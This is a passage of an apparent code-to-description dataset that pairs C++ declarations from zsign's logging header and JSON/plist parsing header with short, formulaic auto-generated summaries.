  {
    "id": "762",
    "code": "static void Debug(const char *szLog);",
    "nl": "Function Debug - implements debug functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "763",
    "code": "static void DebugV(const char *szFormatArgs, ...);",
    "nl": "Function DebugV - implements debugv functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "764",
    "code": "static bool Warn(const char *szLog);",
    "nl": "Function Warn - implements warn functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "765",
    "code": "static bool WarnV(const char *szFormatArgs, ...);",
    "nl": "Function WarnV - implements warnv functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "766",
    "code": "static bool Error(const char *szLog);",
    "nl": "Function Error - implements error functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "767",
    "code": "static bool ErrorV(const char *szFormatArgs, ...);",
    "nl": "Function ErrorV - implements errorv functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "768",
    "code": "static bool Success(const char *szLog);",
    "nl": "Function Success - implements success functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "769",
    "code": "static bool SuccessV(const char *szFormatArgs, ...);",
    "nl": "Function SuccessV - implements successv functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "770",
    "code": "static bool PrintResult(bool bSuccess, const char *szLog);",
    "nl": "Function PrintResult - implements printresult functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "771",
    "code": "static bool PrintResultV(bool bSuccess, const char *szFormatArgs, ...);",
    "nl": "Function PrintResultV - implements printresultv functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "772",
    "code": "static void Print(int nLevel, const char *szLog);",
    "nl": "Function Print - implements print functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "773",
    "code": "static void PrintV(int nLevel, const char *szFormatArgs, ...);",
    "nl": "Function PrintV - implements printv functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "774",
    "code": "static void SetLogLever(int nLogLevel);",
    "nl": "Function SetLogLever - implements setloglever functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "775",
    "code": "static void writeToLogFile(const std::string &message);",
    "nl": "Function writeToLogFile - implements writetologfile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.h",
    "code_type": "function"
  },
  {
    "id": "776",
    "code": "class JValue\n{",
    "nl": "class JValue - implements functionality related to j value",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "class"
  },
  {
    "id": "777",
    "code": "* @param type The type of JValue to create (default is null)\n*/\nexplicit JValue(TYPE type = E_NULL);",
    "nl": "Function create - creates ",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "778",
    "code": "explicit JValue(TYPE type = E_NULL);",
    "nl": "Function JValue - implements jvalue functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "779",
    "code": "explicit JValue(int val);",
    "nl": "Function JValue - implements jvalue functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "780",
    "code": "explicit JValue(bool val);",
    "nl": "Function JValue - implements jvalue functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "781",
    "code": "explicit JValue(double val);",
    "nl": "Function JValue - implements jvalue functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "782",
    "code": "explicit JValue(int64_t val);",
    "nl": "Function JValue - implements jvalue functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "783",
    "code": "explicit JValue(const char *val);",
    "nl": "Function JValue - implements jvalue functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "784",
    "code": "explicit JValue(const string &val);",
    "nl": "Function JValue - implements jvalue functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "785",
    "code": "explicit JValue(const char *val, size_t len);",
    "nl": "Function JValue - implements jvalue functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "786",
    "code": "int asInt() const;",
    "nl": "Function asInt - implements asint functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "787",
    "code": "bool asBool() const;",
    "nl": "Function asBool - implements asbool functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "788",
    "code": "double asFloat() const;",
    "nl": "Function asFloat - implements asfloat functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "789",
    "code": "int64_t asInt64() const;",
    "nl": "Function asInt64 - implements asint64 functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "790",
    "code": "string asString() const;",
    "nl": "Function asString - implements asstring functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "791",
    "code": "time_t asDate() const;",
    "nl": "Function asDate - implements asdate functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "792",
    "code": "string asData() const;",
    "nl": "Function asData - implements asdata functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "793",
    "code": "void assignData(const char *val, size_t size);",
    "nl": "Function assignData - implements assigndata functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "794",
    "code": "void assignDate(time_t val);",
    "nl": "Function assignDate - implements assigndate functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "795",
    "code": "void assignDateString(time_t val);",
    "nl": "Function assignDateString - implements assigndatestring functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "796",
    "code": "TYPE type() const;",
    "nl": "Function type - implements type functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "797",
    "code": "size_t size() const;",
    "nl": "Function size - implements size functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "798",
    "code": "void clear();",
    "nl": "Function clear - implements clear functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "799",
    "code": "bool has(const char *key) const;",
    "nl": "Function has - checks if it has ",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "800",
    "code": "int index(const char *ele) const;",
    "nl": "Function index - implements index functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "801",
    "code": "bool keys(vector<string> &arrKeys) const;",
    "nl": "Function keys - implements keys functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "802",
    "code": "bool join(JValue &jv);",
    "nl": "Function join - implements join functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "803",
    "code": "bool append(JValue &jv);",
    "nl": "Function append - implements append functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "804",
    "code": "bool remove(int index);",
    "nl": "Function remove - implements remove functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "805",
    "code": "bool remove(size_t index);",
    "nl": "Function remove - implements remove functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "806",
    "code": "bool remove(const char *key);",
    "nl": "Function remove - implements remove functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "807",
    "code": "bool push_back(int val);",
    "nl": "Function push_back - implements push back functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "808",
    "code": "bool push_back(bool val);",
    "nl": "Function push_back - implements push back functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "809",
    "code": "bool push_back(double val);",
    "nl": "Function push_back - implements push back functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "810",
    "code": "bool push_back(int64_t val);",
    "nl": "Function push_back - implements push back functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "811",
    "code": "bool push_back(const char *val);",
    "nl": "Function push_back - implements push back functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "812",
    "code": "bool push_back(const string &val);",
    "nl": "Function push_back - implements push back functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "813",
    "code": "bool push_back(const JValue &jval);",
    "nl": "Function push_back - implements push back functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "814",
    "code": "bool push_back(const char *val, size_t len);",
    "nl": "Function push_back - implements push back functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "815",
    "code": "bool isInt() const;",
    "nl": "Function isInt - checks if int",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "816",
    "code": "bool isNull() const;",
    "nl": "Function isNull - checks if null",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "817",
    "code": "bool isBool() const;",
    "nl": "Function isBool - checks if bool",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "818",
    "code": "bool isFloat() const;",
    "nl": "Function isFloat - checks if float",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "819",
    "code": "bool isArray() const;",
    "nl": "Function isArray - checks if array",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "820",
    "code": "bool isObject() const;",
    "nl": "Function isObject - checks if object",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "821",
    "code": "bool isString() const;",
    "nl": "Function isString - checks if string",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "822",
    "code": "bool isEmpty() const;",
    "nl": "Function isEmpty - checks if empty",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "823",
    "code": "bool isData() const;",
    "nl": "Function isData - checks if data",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "824",
    "code": "bool isDate() const;",
    "nl": "Function isDate - checks if date",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "825",
    "code": "bool isDataString() const;",
    "nl": "Function isDataString - checks if datastring",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "826",
    "code": "bool isDateString() const;",
    "nl": "Function isDateString - checks if datestring",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "827",
    "code": "operator int() const;",
    "nl": "Function int - implements int functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "828",
    "code": "operator bool() const;",
    "nl": "Function bool - implements bool functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "829",
    "code": "operator double() const;",
    "nl": "Function double - implements double functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "830",
    "code": "operator int64_t() const;",
    "nl": "Function int64_t - implements int64 t functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "831",
    "code": "operator string() const;",
    "nl": "Function string - implements string functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "832",
    "code": "void Free();",
    "nl": "Function Free - implements free functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "833",
    "code": "void CopyValue(const JValue &src);",
    "nl": "Function CopyValue - implements copyvalue functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "834",
    "code": "bool WriteDataToFile(const char *file, const char *data, size_t len);",
    "nl": "Function WriteDataToFile - implements writedatatofile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "835",
    "code": "string write() const;",
    "nl": "Function write - implements write functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "836",
    "code": "string styleWrite() const;",
    "nl": "Function styleWrite - implements stylewrite functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "837",
    "code": "bool read(const char *pdoc, string *pstrerr = NULL);",
    "nl": "Function read - implements read functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "838",
    "code": "bool read(const string &strdoc, string *pstrerr = NULL);",
    "nl": "Function read - implements read functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "839",
    "code": "string writePList() const;",
    "nl": "Function writePList - implements writeplist functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "840",
    "code": "bool readPList(const string &strdoc, string *pstrerr = NULL);",
    "nl": "Function readPList - implements readplist functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "841",
    "code": "bool readPList(const char *pdoc, size_t len = 0, string *pstrerr = NULL);",
    "nl": "Function readPList - implements readplist functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "842",
    "code": "bool readFile(const char *file, string *pstrerr = NULL);",
    "nl": "Function readFile - implements readfile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "843",
    "code": "bool readPListFile(const char *file, string *pstrerr = NULL);",
    "nl": "Function readPListFile - implements readplistfile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "844",
    "code": "bool writeFile(const char *file);",
    "nl": "Function writeFile - implements writefile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "845",
    "code": "bool writePListFile(const char *file);",
    "nl": "Function writePListFile - implements writeplistfile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "846",
    "code": "bool styleWriteFile(const char *file);",
    "nl": "Function styleWriteFile - implements stylewritefile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "847",
    "code": "bool readPath(const char *path, ...);",
    "nl": "Function readPath - implements readpath functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "848",
    "code": "bool readPListPath(const char *path, ...);",
    "nl": "Function readPListPath - implements readplistpath functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "849",
    "code": "bool writePath(const char *path, ...);",
    "nl": "Function writePath - implements writepath functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "850",
    "code": "bool writePListPath(const char *path, ...);",
    "nl": "Function writePListPath - implements writeplistpath functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "851",
    "code": "bool styleWritePath(const char *path, ...);",
    "nl": "Function styleWritePath - implements stylewritepath functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "852",
    "code": "class JReader\n{",
    "nl": "class JReader - implements functionality related to j reader",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "class"
  },
  {
    "id": "853",
    "code": "bool parse(const char *pdoc, JValue &root);",
    "nl": "Function parse - implements parse functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "854",
    "code": "void error(string &strmsg) const;",
    "nl": "Function error - implements error functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "855",
    "code": "struct Token\n{",
    "nl": "struct Token - implements functionality related to token",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "struct"
  },
  {
    "id": "856",
    "code": "void skipSpaces();",
    "nl": "Function skipSpaces - implements skipspaces functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "857",
    "code": "void skipComment();",
    "nl": "Function skipComment - implements skipcomment functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "858",
    "code": "bool match(const char *pattern, int patternLength);",
    "nl": "Function match - implements match functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "859",
    "code": "bool readToken(Token &token);",
    "nl": "Function readToken - implements readtoken functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "860",
    "code": "bool readValue(JValue &jval);",
    "nl": "Function readValue - implements readvalue functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "861",
    "code": "bool readArray(JValue &jval);",
    "nl": "Function readArray - implements readarray functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "862",
    "code": "void readNumber();",
    "nl": "Function readNumber - implements readnumber functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "863",
    "code": "bool readString();",
    "nl": "Function readString - implements readstring functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "864",
    "code": "bool readObject(JValue &jval);",
    "nl": "Function readObject - implements readobject functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "865",
    "code": "bool decodeNumber(Token &token, JValue &jval);",
    "nl": "Function decodeNumber - implements decodenumber functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "866",
    "code": "bool decodeString(Token &token, string &decoded);",
    "nl": "Function decodeString - implements decodestring functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "867",
    "code": "bool decodeDouble(Token &token, JValue &jval);",
    "nl": "Function decodeDouble - implements decodedouble functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "868",
    "code": "char GetNextChar();",
    "nl": "Function GetNextChar - implements getnextchar functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.h",
    "code_type": "function"
  },
  {
    "id": "869",
